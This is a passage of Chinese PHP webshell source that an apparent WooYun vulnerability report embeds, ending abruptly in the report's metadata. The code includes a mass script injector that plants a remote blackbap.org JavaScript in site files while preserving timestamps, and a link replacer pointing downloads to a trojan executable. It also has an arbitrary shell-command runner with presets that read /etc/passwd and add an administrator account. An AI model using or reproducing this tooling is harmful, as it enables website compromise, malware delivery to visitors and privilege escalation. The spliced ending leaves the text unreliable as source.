value=\"2\">本程序目录</option></select></div><div class=\"actall\" style=\"height:35px;\">文件类型 <input type=\"text\" name=\"gt\" id=\"gt\" value=\".htm|.html|.shtml|.php|.asp|.aspx\" style=\"width:500px;\"><select onchange='return Fulll(options[selectedIndex].value)'><option value=\"0\" selected>--类型选择--</option><option value=\"3\">静态文件</option><option value=\"4\">脚本静态</option><option value=\"5\">JS文件</option></select></div><div class=\"actall\" style=\"height:35px;\">过滤对象 <input type=\"text\" name=\"gl\" value=\"templet|templets|default|editor\" style=\"width:500px;\" disabled><input type=\"radio\" name=\"inout\" value=\"a\" onclick=\"gl.disabled=false;\">开启 <input type=\"radio\" name=\"inout\" value=\"b\" onclick=\"gl.disabled=true;\" checked>关闭</div><div class=\"actall\">挂马代码 <textarea name=\"gc\" id=\"gc\" style=\"width:610px;height:180px;\">&lt;script language=javascript src=\"http://blackbap.org/ad.js?[-6-]\"&gt;&lt;/script&gt;</textarea><div class=\"msgbox\">变形说明: 程序自动寻找[-6-]标签,替换为随机字符,6表示六位随机字符,最大12位,如果不变形可以不加[-6-]标签.<br>示例: &lt;script language=javascript src=\"http://blackbap.org/ad.js?EMTDSU\"&gt;&lt;/script&gt;</div></div><div class=\"actall\" style=\"height:35px;\"><input type=\"radio\" name=\"gi\" value=\"a\" checked>插入&lt;/head&gt;标签之前 <input type=\"radio\" name=\"gi\" value=\"b\">插入文件最顶端<input type=\"radio\" name=\"gi\" value=\"c\"> 插入文件最末尾</div><div class=\"actall\" style=\"height:30px;\"><input type=\"checkbox\" name=\"gx\" value=\"1\" checked>智能过滤重复代码 <input type=\"checkbox\" name=\"gd\" value=\"1\" checked>保持文件修改时间不变</div><div class=\"actall\" style=\"height:50px;\"><input type=\"radio\" name=\"gb\" value=\"a\" checked>将挂马应用于该文件夹,子文件夹和文件<br><input type=\"radio\" name=\"gb\" value=\"b\">仅将挂马应用于该文件夹</div><div class=\"actall\"><input type=\"button\" value=\"开始挂马\" style=\"width:80px;height:26px;\" onclick=\"autorun();\"></div></form>END;return true;}//批量清马function Qingma_Auto($qp,$qt,$qc,$qd,$qb){\tif(($h_d = @opendir($qp)) == NULL) return false;\twhile(false !== ($Filename = @readdir($h_d)))\t{\t\tif($Filename == '.' || $Filename == '..') continue;\t\t$Filepath = File_Str($qp.'/'.$Filename);\t\tif(is_dir($Filepath) && $qb) Qingma_Auto($Filepath,$qt,$qc,$qd,$qb);\t\tif(eregi($qt,$Filename))\t\t{\t\t\t$ic = File_Read($Filepath);\t\t\tif(!stristr($ic,$qc)) continue;\t\t\t$ic = str_replace($qc,'',$ic);\t\t\tif($qd) $ftime = @filemtime($Filepath);\t\t\techo File_Write($Filepath,$ic,'wb') ? '<font color=\"#006600\">成功:</font>'.$Filepath.' <br>'.\"\\r\\n\" : '<font color=\"#FF0000\">失败:</font>'.$Filepath.' <br>'.\"\\r\\n\";\t\t\tif($qd) @touch($Filepath,$ftime);\t\t\tob_flush();\t\t\tflush();\t\t}\t}\t@closedir($h_d);\treturn true;}function Qingma_c(){\tif((!empty($_POST['qp'])) && (!empty($_POST['qt'])) && (!empty($_POST['qc'])))\t{\t\techo '<div class=\"actall\">';\t\t$qt = str_replace('.','\\\\.',$_POST['qt']);\t\t$qd = isset($_POST['qd']) ? true : false;\t\t$qb = ($_POST['qb'] == 'a') ? true : false;\t\techo Qingma_Auto($_POST['qp'],$qt,$_POST['qc'],$qd,$qb) ? '<a href=\"#\" onclick=\"history.back();\">清马完毕</a>' : '<a href=\"#\" onclick=\"history.back();\">异常终止</a>';\t\techo '</div>';\t\treturn false;\t}\t$FILE_DIR = File_Str(dirname(__FILE__));\t$ROOT_DIR = File_Mode();print<<<END<script language=\"javascript\">function Fullll(i){\tif(i==0) return false;  Str = new Array(5);  if(i <= 2){Str[1] = \"{$ROOT_DIR}\";Str[2] = \"{$FILE_DIR}\";xform.qp.value = Str[i];}\telse{Str[3] = \".htm|.html|.shtml\";Str[4] = \".htm|.html|.shtml|.asp|.php|.jsp|.cgi|.aspx|.do\";Str[5] = \".js\";xform.qt.value = Str[i];}  return true;}function autoup(){\tif(document.getElementById('qp').value == ''){alert('路径不能为空');return false;}\tif(document.getElementById('qt').value == ''){alert('类型不能为空');return false;}\tif(document.getElementById('qc').value == ''){alert('代码不能为空');return false;}\tdocument.getElementById('xform').submit();}</script><form method=\"POST\" name=\"xform\" id=\"xform\" action=\"?s=c\"><div class=\"actall\" style=\"height:35px;\">清马路径 <input type=\"text\" name=\"qp\" id=\"qp\" value=\"{$ROOT_DIR}\" style=\"width:500px;\"><select onchange='return Fullll(options[selectedIndex].value)'><option value=\"0\" selected>--范围选择--</option><option value=\"1\">网站根目录</option><option value=\"2\">本程序目录</option></select></div><div class=\"actall\" style=\"height:35px;\">文件类型 <input type=\"text\" name=\"qt\" id=\"qt\" value=\".htm|.html|.shtml|.asp|.aspx|.php\" style=\"width:500px;\"><select onchange='return Fullll(options[selectedIndex].value)'><option value=\"0\" selected>--类型选择--</option><option value=\"3\">静态文件</option><option value=\"4\">脚本+静态</option><option value=\"5\">JS文件</option></select></div><div class=\"actall\">清除代码 <textarea name=\"qc\" id=\"qc\" style=\"width:610px;height:180px;\">&lt;script language=javascript src=\"http://blackbap.org/ad.js\"&gt;&lt;/script&gt;</textarea></div><div class=\"actall\" style=\"height:30px;\"><input type=\"checkbox\" name=\"qd\" value=\"1\" checked>保持文件修改时间不变</div><div class=\"actall\" style=\"height:50px;\"><input type=\"radio\" name=\"qb\" value=\"a\" checked>将清马应用于该文件夹,子文件夹和文件<br><input type=\"radio\" name=\"qb\" value=\"b\">仅将清马应用于该文件夹</div><div class=\"actall\"><input type=\"button\" value=\"开始清马\" style=\"width:80px;height:26px;\" onclick=\"autoup();\"></div></form>END;\treturn true;}//批量替换function Tihuan_Auto($tp,$tt,$th,$tca,$tcb,$td,$tb){\tif(($h_d = @opendir($tp)) == NULL) return false;\twhile(false !== ($Filename = @readdir($h_d)))\t{\t\tif($Filename == '.' || $Filename == '..') continue;\t\t$Filepath = File_Str($tp.'/'.$Filename);\t\tif(is_dir($Filepath) && $tb) Tihuan_Auto($Filepath,$tt,$th,$tca,$tcb,$td,$tb);\t\t$doing = false;\t\tif(eregi($tt,$Filename))\t\t{\t\t\t$ic = File_Read($Filepath);\t\t\tif($th)\t\t\t{\t\t\t\tif(!stristr($ic,$tca)) continue;\t\t\t\t$ic = str_replace($tca,$tcb,$ic);\t\t\t\t$doing = true;\t\t\t}\t\t\telse\t\t\t{\t\t\t\tpreg_match_all(\"/href\\=\\\"([^~]*?)\\\"/i\",$ic,$nc);\t\t\t\tfor($i = 0;$i < count($nc[1]);$i++){if(eregi($tca,$nc[1][$i])){$ic = str_replace($nc[1][$i],$tcb,$ic);$doing = true;}}\t\t\t}\t\t\tif($td) $ftime = @filemtime($Filepath);\t\t\tif($doing) echo File_Write($Filepath,$ic,'wb') ? '<font color=\"#006600\">成功:</font>'.$Filepath.' <br>'.\"\\r\\n\" : '<font color=\"#FF0000\">失败:</font>'.$Filepath.' <br>'.\"\\r\\n\";\t\t\tif($td) @touch($Filepath,$ftime);\t\t\tob_flush();\t\t\tflush();\t\t}\t}\t@closedir($h_d);\treturn true;}function Tihuan_d(){\tif((!empty($_POST['tp'])) && (!empty($_POST['tt'])))\t{\t\techo '<div class=\"actall\">';\t\t$tt = str_replace('.','\\\\.',$_POST['tt']);\t\t$td = isset($_POST['td']) ? true : false;\t\t$tb = ($_POST['tb'] == 'a') ? true : false;\t\t$th = ($_POST['th'] == 'a') ? true : false;\t\tif($th) $_POST['tca'] = str_replace('.','\\\\.',$_POST['tca']);\t\techo Tihuan_Auto($_POST['tp'],$tt,$th,$_POST['tca'],$_POST['tcb'],$td,$tb) ? '<a href=\"#\" onclick=\"window.location=\\'?s=d\\'\">替换完毕</a>' : '<a href=\"#\" onclick=\"window.location=\\'?s=d\\'\">异常终止</a>';\t\techo '</div>';\t\treturn false;\t}\t$FILE_DIR = File_Str(dirname(__FILE__));\t$ROOT_DIR = File_Mode();print<<<END<script language=\"javascript\">function Fulllll(i){\tif(i==0) return false;  Str = new Array(5);  if(i <= 2){Str[1] = \"{$ROOT_DIR}\";Str[2] = \"{$FILE_DIR}\";tform.tp.value = Str[i];}\telse{Str[3] = \".htm|.html|.shtml\";Str[4] = \".htm|.html|.shtml|.asp|.php|.jsp|.cgi|.aspx|.do\";Str[5] = \".js\";tform.tt.value = Str[i];}  return true;}function showth(th){\tif(th == 'a') document.getElementById('setauto').innerHTML = '查找内容:<textarea name=\"tca\" id=\"tca\" style=\"width:610px;height:100px;\"></textarea><br>替换成为:<textarea name=\"tcb\" id=\"tcb\" style=\"width:610px;height:100px;\"></textarea>';\tif(th == 'b') document.getElementById('setauto').innerHTML = '<br>下载后缀 <input type=\"text\" name=\"tca\" id=\"tca\" value=\".exe|.7z|.rar|.zip|.gz|.txt\" style=\"width:500px;\"><br><br>替换成为 <input type=\"text\" name=\"tcb\" id=\"tcb\" value=\"http://blackbap.org/muma.exe\" style=\"width:500px;\">';\treturn true;}function autoup(){\tif(document.getElementById('tp').value == ''){alert('路径不能为空');return false;}\tif(document.getElementById('tt').value == ''){alert('类型不能为空');return false;}\tif(document.getElementById('tca').value == ''){alert('代码不能为空');return false;}\tdocument.getElementById('tform').submit();}</script><form method=\"POST\" name=\"tform\" id=\"tform\" action=\"?s=d\"><div class=\"actall\" style=\"height:35px;\">替换路径 <input type=\"text\" name=\"tp\" id=\"tp\" value=\"{$ROOT_DIR}\" style=\"width:500px;\"><select onchange='return Fulllll(options[selectedIndex].value)'><option value=\"0\" selected>--范围选择--</option><option value=\"1\">网站根目录</option><option value=\"2\">本程序目录</option></select></div><div class=\"actall\" style=\"height:35px;\">文件类型 <input type=\"text\" name=\"tt\" id=\"tt\" value=\".htm|.html|.shtml\" style=\"width:500px;\"><select onchange='return Fulllll(options[selectedIndex].value)'><option value=\"0\" selected>--类型选择--</option><option value=\"3\">静态文件</option><option value=\"4\">脚本+静态</option><option value=\"5\">JS文件</option></select></div><div class=\"actall\" style=\"height:235px;\"><input type=\"radio\" name=\"th\" value=\"a\" onclick=\"showth('a')\" checked>替换文件中的指定内容 <input type=\"radio\" name=\"th\" value=\"b\" onclick=\"showth('b')\">替换文件中的下载地址<br><div id=\"setauto\">查找内容 <textarea name=\"tca\" id=\"tca\" style=\"width:610px;height:100px;\"></textarea><br>替换成为 <textarea name=\"tcb\" id=\"tcb\" style=\"width:610px;height:100px;\"></textarea></div></div><div class=\"actall\" style=\"height:30px;\"><input type=\"checkbox\" name=\"td\" value=\"1\" checked>保持文件修改时间不变</div><div class=\"actall\" style=\"height:50px;\"><input type=\"radio\" name=\"tb\" value=\"a\" checked>将替换应用于该文件夹,子文件夹和文件<br><input type=\"radio\" name=\"tb\" value=\"b\">仅将替换应用于该文件夹</div><div class=\"actall\"><input type=\"button\" value=\"开始替换\" style=\"width:80px;height:26px;\" onclick=\"autoup();\"></div></form>END;return true;}//扫描木马function Antivirus_Auto($sp,$features,$st,$sb){\tif(($h_d = @opendir($sp)) == NULL) return false;\t$ROOT_DIR = File_Mode();\twhile(false !== ($Filename = @readdir($h_d)))\t{\t\tif($Filename == '.' || $Filename == '..') continue;\t\t$Filepath = File_Str($sp.'/'.$Filename);\t\tif(is_dir($Filepath) && $sb) Antivirus_Auto($Filepath,$features,$st);\t\tif(eregi($st,$Filename))\t\t{\t\t\tif($Filepath == File_Str(__FILE__)) continue;\t\t\t$ic = File_Read($Filepath);\t\t\tforeach($features as $var => $key)\t\t\t{\t\t\t\tif(stristr($ic,$key))\t\t\t\t{\t\t\t\t\t$Fileurls = str_replace($ROOT_DIR,'http://'.$_SERVER['SERVER_NAME'].'/',$Filepath);\t\t\t\t\t$Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));\t\t\t\t\techo ' <a href=\"'.$Fileurls.'\" target=\"_blank\"> <font color=\"#8B0000\"> '.$Filepath.' </font> </a> <br> 【<a href=\"?s=e&fp='.urlencode($sp).'&fn='.$Filename.'&dim='.urlencode($key).'\" target=\"_blank\"> 编辑 </a> <a href=\"?s=e&df='.urlencode($Filepath).'\" target=\"_blank\"> 删除 </a> 】 ';\t\t\t\t\techo ' 【 '.$Filetime.' 】 <font color=\"#FF0000\"> '.$var.' </font> <br> <br> '.\"\\r\\n\";\t\t\t\t\tbreak;\t\t\t\t}\t\t\t}\t\t\tob_flush();\t\t\tflush();\t\t}\t}\t@closedir($h_d);\treturn true;}function Antivirus_e(){\tif(!empty($_GET['df'])){echo $_GET['df'];if(@unlink($_GET['df'])){echo '删除成功';}else{@chmod($_GET['df'],0666);echo @unlink($_GET['df']) ? '删除成功' : '删除失败';} return false;}\tif((!empty($_GET['fp'])) && (!empty($_GET['fn'])) && (!empty($_GET['dim']))) { File_Edit($_GET['fp'],$_GET['fn'],$_GET['dim']); return false; }\t$SCAN_DIR = isset($_POST['sp']) ? $_POST['sp'] : File_Mode();\t$features_php = array('eval一句话特征'=>'eval(','大马read特征'=>'->read()','大马readdir特征3'=>'readdir(','MYSQL自定义函数语句'=>'returns string soname','加密特征1'=>'eval(gzinflate(','加密特征2'=>'eval(base64_decode(','加密特征3'=>'base64_decode(','eval一句话2'=>'eval (','php复制特征'=>'copy($_FILES','复制特征2'=>'copy ($_FILES','上传特征'=>'move_uploaded_file($_FILES','上传特征2'=>'move_uploaded_file ($_FILES','小马特征'=>'str_replace(\\'\\\\\\\\\\',\\'/\\',');\t$features_asx = array('脚本加密'=>'VBScript.Encode','加密特征'=>'#@~^','fso组件'=>'fso.createtextfile(path,true)','excute一句话'=>'execute','eval一句话'=>'eval','wscript特征'=>'F935DC22-1CF0-11D0-ADB9-00C04FD58A0B','数据库操作特征'=>'13709620-C279-11CE-A49E-444553540000','wscript特征'=>'WScript.Shell','fso特征'=>'0D43FE01-F093-11CF-8940-00A0C9054228','十三函数'=>'╋╁','aspx大马特征'=>'Process.GetProcesses','aspx一句话'=>'Request.BinaryRead');print<<<END<form method=\"POST\" name=\"tform\" id=\"tform\" action=\"?s=e\"><div class=\"actall\">扫描路径 <input type=\"text\" name=\"sp\" id=\"sp\" value=\"{$SCAN_DIR}\" style=\"width:600px;\"></div><div class=\"actall\">木马类型 <input type=\"checkbox\" name=\"stphp\" value=\"php\" checked>php木马 <input type=\"checkbox\" name=\"stasx\" value=\"asx\">asp+aspx木马</div><div class=\"actall\" style=\"height:50px;\"><input type=\"radio\" name=\"sb\" value=\"a\" checked>将扫马应用于该文件夹,子文件夹和文件<br><input type=\"radio\" name=\"sb\" value=\"b\">仅将扫马应用于该文件夹</div><div class=\"actall\"><input type=\"submit\" value=\"开始扫描\" style=\"width:80px;\"></div></form>END;if(!empty($_POST['sp'])){\techo '<div class=\"actall\">';\tif(isset($_POST['stphp'])){$features_all = $features_php; $st = '\\.php|\\.inc|\\;';}\tif(isset($_POST['stasx'])){$features_all = $features_asx; $st = '\\.asp|\\.asa|\\.cer|\\.aspx|\\.ascx|\\;';}\tif(isset($_POST['stphp']) && isset($_POST['stasx'])){$features_all = array_merge($features_php,$features_asx); $st = '\\.php|\\.inc|\\.asp|\\.asa|\\.cer|\\.aspx|\\.ascx|\\;';}\t$sb = ($_POST['sb'] == 'a') ? true : false;\techo Antivirus_Auto($_POST['sp'],$features_all,$st,$sb) ? '扫描完毕' :  '异常终止';\techo '</div>';}return true;}//搜索文件function Findfile_Auto($sfp,$sfc,$sft,$sff,$sfb){\t//echo $sfp.'<br>'.$sfc.'<br>'.$sft.'<br>'.$sff.'<br>'.$sfb;\tif(($h_d = @opendir($sfp)) == NULL) return false;\twhile(false !== ($Filename = @readdir($h_d)))\t{\t\tif($Filename == '.' || $Filename == '..') continue;\t\tif(eregi($sft,$Filename)) continue;\t\t$Filepath = File_Str($sfp.'/'.$Filename);\t\tif(is_dir($Filepath) && $sfb) Findfile_Auto($Filepath,$sfc,$sft,$sff,$sfb);\t\tif($sff)\t\t{\t\t\tif(stristr($Filename,$sfc))\t\t\t{\t\t\t\techo '<a target=\"_blank\" href=\"?s=p&fp='.urlencode($sfp).'&fn='.urlencode($Filename).'\"> '.$Filepath.' </a><br>'.\"\\r\\n\";\t\t\t\tob_flush();\t\t\t\tflush();\t\t\t}\t\t}\t\telse\t\t{\t\t\t$File_code = File_Read($Filepath);\t\t\tif(stristr($File_code,$sfc))\t\t\t{\t\t\t\techo '<a target=\"_blank\" href=\"?s=p&fp='.urlencode($sfp).'&fn='.urlencode($Filename).'\"> '.$Filepath.' </a><br>'.\"\\r\\n\";\t\t\t\tob_flush();\t\t\t\tflush();\t\t\t}\t\t}\t}\t@closedir($h_d);\treturn true;}function Findfile_j(){\tif(!empty($_GET['df'])){echo $_GET['df'];if(@unlink($_GET['df'])){echo '删除成功';}else{@chmod($_GET['df'],0666);echo @unlink($_GET['df']) ? '删除成功' : '删除失败';} return false;}\tif((!empty($_GET['fp'])) && (!empty($_GET['fn'])) && (!empty($_GET['dim']))) { File_Edit($_GET['fp'],$_GET['fn'],$_GET['dim']); return false; }\t$SCAN_DIR = isset($_POST['sfp']) ? $_POST['sfp'] : File_Mode();\t$SCAN_CODE = isset($_POST['sfc']) ? $_POST['sfc'] : 'config';\t$SCAN_TYPE = isset($_POST['sft']) ? $_POST['sft'] : '.mp3|.mp4|.avi|.swf|.jpg|.gif|.png|.bmp|.gho|.rar|.exe|.zip';print<<<END<form method=\"POST\" name=\"jform\" id=\"jform\" action=\"?s=j\"><div class=\"actall\">扫描路径 <input type=\"text\" name=\"sfp\" value=\"{$SCAN_DIR}\" style=\"width:600px;\"></div><div class=\"actall\">过滤文件 <input type=\"text\" name=\"sft\" value=\"{$SCAN_TYPE}\" style=\"width:600px;\"></div><div class=\"actall\">关键字串 <input type=\"text\" name=\"sfc\" value=\"{$SCAN_CODE}\" style=\"width:395px;\"><input type=\"radio\" name=\"sff\" value=\"a\" checked>搜索文件名 <input type=\"radio\" name=\"sff\" value=\"b\">搜索包含文字</div><div class=\"actall\" style=\"height:50px;\"><input type=\"radio\" name=\"sfb\" value=\"a\" checked>将搜索应用于该文件夹,子文件夹和文件<br><input type=\"radio\" name=\"sfb\" value=\"b\">仅将搜索应用于该文件夹</div><div class=\"actall\"><input type=\"submit\" value=\"开始扫描\" style=\"width:80px;\"></div></form>END;\tif((!empty($_POST['sfp'])) && (!empty($_POST['sfc'])))\t{\t\techo '<div class=\"actall\">';\t\t$_POST['sft'] = str_replace('.','\\\\.',$_POST['sft']);\t\t$sff = ($_POST['sff'] == 'a') ? true : false;\t\t$sfb = ($_POST['sfb'] == 'a') ? true : false;\t\techo Findfile_Auto($_POST['sfp'],$_POST['sfc'],$_POST['sft'],$sff,$sfb) ? '搜索完毕' : '异常终止';\t\techo '</div>';\t}\treturn true;}//系统信息function Info_Cfg($varname){switch($result = get_cfg_var($varname)){case 0: return \"No\"; break; case 1: return \"Yes\"; break; default: return $result; break;}}function Info_Fun($funName){return (false !== function_exists($funName)) ? \"Yes\" : \"No\";}function Info_f(){\t$dis_func = get_cfg_var(\"disable_functions\");\t$upsize = get_cfg_var(\"file_uploads\") ? get_cfg_var(\"upload_max_filesize\") : \"不允许上传\";\t$adminmail = (isset($_SERVER['SERVER_ADMIN'])) ? \"<a href=\\\"mailto:\".$_SERVER['SERVER_ADMIN'].\"\\\">\".$_SERVER['SERVER_ADMIN'].\"</a>\" : \"<a href=\\\"mailto:\".get_cfg_var(\"sendmail_from\").\"\\\">\".get_cfg_var(\"sendmail_from\").\"</a>\";\tif($dis_func == \"\"){$dis_func = \"No\";}else{$dis_func = str_replace(\" \",\"<br>\",$dis_func);$dis_func = str_replace(\",\",\"<br>\",$dis_func);}\t$phpinfo = (!eregi(\"phpinfo\",$dis_func)) ? \"Yes\" : \"No\";\t$info = array(\t\tarray(\"服务器时间\",date(\"Y年m月d日 h:i:s\",time())),\t\tarray(\"服务器域名\",\"<a href=\\\"http://\".$_SERVER['SERVER_NAME'].\"\\\" target=\\\"_blank\\\">\".$_SERVER['SERVER_NAME'].\"</a>\"),\t\tarray(\"服务器IP地址\",gethostbyname($_SERVER['SERVER_NAME'])),\t\tarray(\"服务器操作系统\",PHP_OS),\t\tarray(\"服务器操作系统文字编码\",$_SERVER['HTTP_ACCEPT_LANGUAGE']),\t\tarray(\"服务器解译引擎\",$_SERVER['SERVER_SOFTWARE']),\t\tarray(\"你的IP\",getenv('REMOTE_ADDR')),\t\tarray(\"Web服务端口\",$_SERVER['SERVER_PORT']),\t\tarray(\"PHP运行方式\",strtoupper(php_sapi_name())),\t\tarray(\"PHP版本\",PHP_VERSION),\t\tarray(\"运行于安全模式\",Info_Cfg(\"safemode\")),\t\tarray(\"服务器管理员\",$adminmail),\t\tarray(\"本文件路径\",__FILE__),\t\tarray(\"允许使用 URL 打开文件 allow_url_fopen\",Info_Cfg(\"allow_url_fopen\")),\t\tarray(\"允许动态加载链接库 enable_dl\",Info_Cfg(\"enable_dl\")),\t\tarray(\"显示错误信息 display_errors\",Info_Cfg(\"display_errors\")),\t\tarray(\"自动定义全局变量 register_globals\",Info_Cfg(\"register_globals\")),\t\tarray(\"magic_quotes_gpc\",Info_Cfg(\"magic_quotes_gpc\")),\t\tarray(\"程序最多允许使用内存量 memory_limit\",Info_Cfg(\"memory_limit\")),\t\tarray(\"POST最大字节数 post_max_size\",Info_Cfg(\"post_max_size\")),\t\tarray(\"允许最大上传文件 upload_max_filesize\",$upsize),\t\tarray(\"程序最长运行时间 max_execution_time\",Info_Cfg(\"max_execution_time\").\"秒\"),\t\tarray(\"被禁用的函数 disable_functions\",$dis_func),\t\tarray(\"phpinfo()\",$phpinfo),\t\tarray(\"目前还有空余空间diskfreespace\",intval(diskfreespace(\".\") / (1024 * 1024)).'Mb'),\t\tarray(\"图形处理 GD Library\",Info_Fun(\"imageline\")),\t\tarray(\"IMAP电子邮件系统\",Info_Fun(\"imap_close\")),\t\tarray(\"MySQL数据库\",Info_Fun(\"mysql_close\")),\t\tarray(\"SyBase数据库\",Info_Fun(\"sybase_close\")),\t\tarray(\"Oracle数据库\",Info_Fun(\"ora_close\")),\t\tarray(\"Oracle 8 数据库\",Info_Fun(\"OCILogOff\")),\t\tarray(\"PREL相容语法 PCRE\",Info_Fun(\"preg_match\")),\t\tarray(\"PDF文档支持\",Info_Fun(\"pdf_close\")),\t\tarray(\"Postgre SQL数据库\",Info_Fun(\"pg_close\")),\t\tarray(\"SNMP网络管理协议\",Info_Fun(\"snmpget\")),\t\tarray(\"压缩文件支持(Zlib)\",Info_Fun(\"gzclose\")),\t\tarray(\"XML解析\",Info_Fun(\"xml_set_object\")),\t\tarray(\"FTP\",Info_Fun(\"ftp_login\")),\t\tarray(\"ODBC数据库连接\",Info_Fun(\"odbc_close\")),\t\tarray(\"Session支持\",Info_Fun(\"session_start\")),\t\tarray(\"Socket支持\",Info_Fun(\"fsockopen\")),\t);\techo '<table width=\"100%\" border=\"0\">';\tfor($i = 0;$i < count($info);$i++){echo '<tr><td width=\"40%\">'.$info[$i][0].'</td><td>'.$info[$i][1].'</td></tr>'.\"\\n\";}\techo '</table>';\treturn true;}//执行命令function Exec_Run($cmd){\t$res = '';\tif(function_exists('exec')){@exec($cmd,$res);$res = join(\"\\n\",$res);}\telseif(function_exists('shell_exec')){$res = @shell_exec($cmd);}\telseif(function_exists('system')){@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();}\telseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_contents();@ob_end_clean();}\telseif(@is_resource($f = @popen($cmd,\"r\"))){$res = '';while(!@feof($f)){$res .= @fread($f,1024);}@pclose($f);}\treturn $res;}function Exec_g(){\t$res = '回显';\t$cmd = 'dir';\tif(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];}print<<<END<script language=\"javascript\">function sFull(i){\tStr = new Array(14);\tStr[0] = \"dir\";\tStr[1] = \"ls /etc\";\tStr[2] = \"cat /etc/passwd\";\tStr[3] = \"cp -a /home/www/html/a.php /home/www2/\";\tStr[4] = \"uname -a\";\tStr[5] = \"gcc -o /tmp/silic /tmp/silic.c\";\tStr[6] = \"net user silic silic /add & net localgroup administrators silic /add\";\tStr[7] = \"net user\";\tStr[8] = \"netstat -an\";\tStr[9] = \"ipconfig\";\tStr[10] = \"copy c:\\\\1.php d:\\\\2.php\";\tStr[11] = \"tftp    修复方案：  1.发现php木马已在2013年11月15日被getshell2.逐一对站点进行排查3.Thinkphp框架版本过低，存在过多问题   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：15 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 15, "Ranks": null}